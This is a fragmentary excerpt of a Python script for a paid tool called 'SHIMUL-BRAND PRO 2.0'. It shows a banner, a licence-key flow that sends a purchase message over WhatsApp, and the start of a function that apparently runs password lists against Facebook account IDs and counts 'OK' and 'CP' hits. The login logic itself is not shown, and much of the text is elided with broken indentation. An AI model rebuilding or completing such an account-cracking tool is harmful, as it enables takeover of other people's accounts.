...
----------------------------------------------
 ...
 Github    : MRSH4MUL
 Facebook  : MD SHIMUL
 Tool Name : SHIMUL-BRAND 
 Type type : PAID
 Version   : 2.0
----------------------------------------------
 SHIMUL PRO VERSION 2.0
 FEEL THE POWER OF SHIMUL (⁠⌐⁠■⁠-⁠■⁠)
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://www.facebook.com/profile.php?id=100082346206254');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use 🥰 ')
                        else:
                        ...
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+01830733258&text="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi SHIMUL Sir, I Need To Buy Your Paid SHIMUL PRO Tools Version 2.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [SHIMUL-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
